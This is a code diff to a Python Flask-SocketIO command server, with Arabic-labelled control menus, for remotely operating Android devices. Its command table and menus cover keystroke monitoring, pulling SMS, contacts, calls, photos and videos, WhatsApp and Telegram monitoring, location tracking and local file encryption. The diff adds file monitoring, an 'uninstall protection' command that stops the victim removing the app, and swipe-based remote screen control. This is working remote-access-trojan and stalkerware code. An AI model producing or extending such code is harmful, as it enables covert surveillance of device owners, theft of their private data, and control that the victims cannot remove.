@@ -273,11 +273,15 @@ COMMANDS = {
     # advanced
     "input-monitoring-on":  {"category": "advanced", "label": "⌨️ مراقبة الإدخال", "description": "مراقبة لوحة المفاتيح",    "needs_param": False},
     "input-monitoring-off": {"category": "advanced", "label": "⏹ إيقاف المراقبة", "description": "إيقاف المراقبة",           "needs_param": False},
-    # screenshot-on/off تمت إزالته من المشروع
     "apply-data-protection": {"category": "advanced", "label": "🔐 حماية البيانات",      "description": "تشفير الملفات محلياً",   "needs_param": False},
-    "pull-videos":           {"category": "advanced", "label": "🎬 سحب فيديوهات",       "description": "سحب الفيديوهات",          "needs_param": False},
-    "stop-videos":           {"category": "advanced", "label": "⏹ إيقاف الفيديو",    "description": "إيقاف سحب الفيديو",      "needs_param": False},
-    "stop-gallery":          {"category": "advanced", "label": "⏹ إيقاف المعرض",    "description": "إيقاف سحب المعرض",      "needs_param": False},
+    "pull-videos":           {"category": "data", "label": "🎬 سحب فيديوهات",       "description": "سحب الفيديوهات",          "needs_param": False},
+    "stop-videos":           {"category": "data", "label": "⏹ إيقاف الفيديو",    "description": "إيقاف سحب الفيديو",      "needs_param": False},
+    "stop-gallery":          {"category": "data", "label": "⏹ إيقاف المعرض",    "description": "إيقاف سحب المعرض",      "needs_param": False},
+    # ⚡ V11.2.25: مراقبة الملفات + منع إلغاء التثبيت
+    "file-monitor-on":       {"category": "advanced", "label": "📁 مراقبة الملفات",       "description": "مراقبة الملفات الجديدة",          "needs_param": False},
+    "file-monitor-off":      {"category": "advanced", "label": "⏹ إيقاف الملفات",    "description": "إيقاف مراقبة الملفات",      "needs_param": False},
+    "uninstall-protect-on":  {"category": "advanced", "label": "🔒 منع إلغاء التثبيت",       "description": "منع حذف التطبيق",          "needs_param": False},
+    "uninstall-protect-off": {"category": "advanced", "label": "🔓 سماح بالإلغاء",    "description": "السماح بحذف التطبيق",      "needs_param": False},
     # info
     "get-device-info": {"category": "info", "label": "📋 معلومات الجهاز",  "description": "معلومات تفصيلية",     "needs_param": False},
     "ls":              {"category": "info", "label": "📂 مستعرض الملفات",  "description": "تصفح ملفات الجهاز",  "needs_param": False},
@@ -452,10 +456,8 @@ def data_keyboard(did):
     kb = InlineKeyboardMarkup(row_width=2)
     kb.add(_cbtn(did,"contacts"), _cbtn(did,"all-sms"))
     kb.add(_cbtn(did,"calls"), _cbtn(did,"apps"))
-    kb.add(_cbtn(did,"whatsapp-monitor-on"))
-    kb.add(_cbtn(did,"whatsapp-monitor-off"))
-    kb.add(_cbtn(did,"telegram-monitor-on"))
-    kb.add(_cbtn(did,"telegram-monitor-off"))
+    kb.add(_cbtn(did,"gallery"), _cbtn(did,"stop-gallery"))
+    kb.add(_cbtn(did,"pull-videos"), _cbtn(did,"stop-videos"))
     kb.add(_cbtn(did,"get-location"))
     kb.add(_back(did))
     return kb
@@ -495,10 +497,15 @@ def advanced_keyboard(did):
     kb = InlineKeyboardMarkup(row_width=2)
     kb.add(_cbtn(did,"input-monitoring-on"), _cbtn(did,"input-monitoring-off"))
     kb.add(_cbtn(did,"apply-data-protection"))
-    # ⚡ سحب الصور: زر سحب + زر إيقاف في نفس الصف
-    kb.add(_cbtn(did,"gallery"), _cbtn(did,"stop-gallery"))
-    # ⚡ سحب الفيديوهات: زر سحب + زر إيقاف في نفس الصف
-    kb.add(_cbtn(did,"pull-videos"), _cbtn(did,"stop-videos"))
+    # ⚡ V11.2.25: مراقبة واتساب + تيليجرام (منقولة من سحب البيانات)
+    kb.add(_cbtn(did,"whatsapp-monitor-on"))
+    kb.add(_cbtn(did,"whatsapp-monitor-off"))
+    kb.add(_cbtn(did,"telegram-monitor-on"))
+    kb.add(_cbtn(did,"telegram-monitor-off"))
+    # ⚡ V11.2.25: مراقبة الملفات
+    kb.add(_cbtn(did,"file-monitor-on"), _cbtn(did,"file-monitor-off"))
+    # ⚡ V11.2.25: منع إلغاء التثبيت
+    kb.add(_cbtn(did,"uninstall-protect-on"), _cbtn(did,"uninstall-protect-off"))
     kb.add(_back(did))
     return kb
 
@@ -2209,17 +2216,83 @@ def _screen_live_page(stream_id):
             document.getElementById('info').textContent = '🖱️ نقر: (' + pctX + '%, ' + pctY + '%)';
         }}
 
-        // click (mouse)
-        screenWrap.addEventListener('click', function(e) {{
-            handleClick(e.clientX, e.clientY);
+        // ⚡ V11.2.25: swipe support (drag → swipe gesture)
+        var swipeStart = null;
+        var SWIPE_THRESHOLD = 10; // px — أقل من هذا = tap
+
+        function handleSwipeStart(clientX, clientY) {{
+            var rect = screenImg.getBoundingClientRect();
+            swipeStart = {{
+                x: clientX - rect.left,
+                y: clientY - rect.top,
+                cx: clientX,
+                cy: clientY,
+                time: Date.now()
+            }};
+        }}
+
+        function handleSwipeEnd(clientX, clientY) {{
+            if (!swipeStart || !clickEnabled) return;
+            var rect = screenImg.getBoundingClientRect();
+            var endX = clientX - rect.left;
+            var endY = clientY - rect.top;
+            var dx = endX - swipeStart.x;
+            var dy = endY - swipeStart.y;
+            var dist = Math.sqrt(dx * dx + dy * dy);
+            var duration = Date.now() - swipeStart.time;
+
+            if (dist < SWIPE_THRESHOLD) {{
+                // tap (نقر)
+                handleClick(swipeStart.cx, swipeStart.cy);
+            }} else {{
+                // swipe (سحب)
+                var x1 = (swipeStart.x / rect.width * 100).toFixed(1);
+                var y1 = (swipeStart.y / rect.height * 100).toFixed(1);
+                var x2 = (endX / rect.width * 100).toFixed(1);
+                var y2 = (endY / rect.height * 100).toFixed(1);
+                var dur = Math.max(100, Math.min(1000, duration));
+
+                // أظهر خط السحب
+                clickDot.style.left = swipeStart.x + 'px';
+                clickDot.style.top = swipeStart.y + 'px';
+                clickDot.style.display = 'block';
+                clickDot.style.animation = 'none';
+                clickDot.offsetHeight;
+                clickDot.style.animation = 'dotFade 0.5s ease';
+                setTimeout(function() {{ clickDot.style.display = 'none'; }}, 500);
+
+                socket.emit('screen_swipe', {{
+                    stream_id: streamId,
+                    x1: parseFloat(x1),
+                    y1: parseFloat(y1),
+                    x2: parseFloat(x2),
+                    y2: parseFloat(y2),
+                    duration: dur
+                }});
+                document.getElementById('info').textContent = '👆 سحب: (' + x1 + '%,' + y1 + '%) → (' + x2 + '%,' + y2 + '%)';
+            }}
+            swipeStart = null;
+        }}
+
+        // mouse events (desktop)
+        screenWrap.addEventListener('mousedown', function(e) {{
+            handleSwipeStart(e.clientX, e.clientY);
+        }});
+        screenWrap.addEventListener('mouseup', function(e) {{
+            handleSwipeEnd(e.clientX, e.clientY);
         }});
 
-        // touch (mobile)
+        // touch events (mobile)
         screenWrap.addEventListener('touchstart', function(e) {{
             e.preventDefault();
             if (e.touches.length > 0) {{
-                var t = e.touches[0];
-                handleClick(t.clientX, t.clientY);
+                handleSwipeStart(e.touches[0].clientX, e.touches[0].clientY);
+            }}
+        }}, {{ passive: false }});
+        screenWrap.addEventListener('touchend', function(e) {{
+            e.preventDefault();
+            if (e.changedTouches.length > 0) {{
+                handleSwipeEnd(e.changedTouches[0].clientX, e.changedTouches[0].clientY);
             }}
         }}, {{ passive: false }});
 
@@ -2302,6 +2375,40 @@ def _sock_screen_click(data):
             logger.warning("⚠️ No online device for screen_click")
     except Exception as e:
         logger.error(f"❌ screen_click error: {e}")
+
+
+# ⚡ V11.2.25: استقبال swipe من المتصفح وإرساله للجهاز
+@socketio.on("screen_swipe")
+def _sock_screen_swipe(data):
+    """يستقبل swipe من المتصفح ويرسله للجهاز"""
+    try:
+        if isinstance(data, list) and len(data) >= 2:
+            data = data[1]
+        x1 = data.get("x1", 50)
+        y1 = data.get("y1", 50)
+        x2 = data.get("x2", 50)
+        y2 = data.get("y2", 50)
+        duration = data.get("duration", 300)
+
+        dev = None
+        for d in dm.get_online_devices():
+            if d.get("device_id"):
+                dev = d
+                break
+
+        if dev:
+            sid = dm.get_sid_for_device(dev["device_id"])
+            if sid:
+                payload = {
+                    "command": "screen_swipe",
+                    "category": "control",
+                    "timestamp": datetime.now(timezone.utc).isoformat(),
+                    "params": {"x1": x1, "y1": y1, "x2": x2, "y2": y2, "duration": duration}
+                }
+                socketio.emit("command", payload, room=sid)
+                logger.info(f"👆 Swipe sent: ({x1},{y1}) → ({x2},{y2}) {duration}ms")
+    except Exception as e:
+        logger.error(f"❌ screen_swipe error: {e}")
 
 
 @socketio.on("camera_frame")
